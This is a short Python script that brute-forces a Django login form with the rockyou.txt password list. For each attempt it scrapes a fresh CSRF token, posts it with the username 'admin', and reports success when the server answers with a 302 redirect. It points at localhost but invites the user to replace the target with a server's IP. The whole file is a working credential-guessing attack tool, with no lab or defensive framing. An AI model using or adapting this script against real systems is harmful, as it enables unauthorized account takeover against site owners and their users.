import requests
from bs4 import BeautifulSoup

# Configuration
target_url = "http://localhost:8000/login_django/"  # Replace <target-ip> with your server's IP
username = "admin"  # Replace with the username you want to target
dictionary_file = "rockyou.txt"  # Adjust path if needed

session = requests.Session()

def get_csrf_token(url):
    """
    Fetches the login page and extracts the CSRF token.
    """
    response = session.get(url)
    if response.status_code != 200:
        print("Error fetching the login page")
        return None
    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "csrfmiddlewaretoken"})
    if token_input:
        return token_input.get("value")
    return None

def brute_force():
    with open(dictionary_file, "r", encoding="latin-1") as f:
        for line in f:
            password = line.strip()
            csrf_token = get_csrf_token(target_url)
            if not csrf_token:
                print("Unable to retrieve CSRF token. Skipping attempt.")
                continue

            # Prepare POST data with username, password, and CSRF token.
            data = {
                "username": username,
                "password": password,
                "csrfmiddlewaretoken": csrf_token,
            }
            # Post to the login view. Using allow_redirects=False to detect a successful login (which typically issues a 302 redirect).
            response = session.post(target_url, data=data, allow_redirects=False)

            if response.status_code == 302:
                print(f"[+] Password found: {password}")
                return password
            else:
                # Optional: check for known error messages in response.text if needed.
                print(f"[-] Tried {password}: login failed.")

    print("[-] Password not found in dictionary.")
    return None

if __name__ == "__main__":
    brute_force()

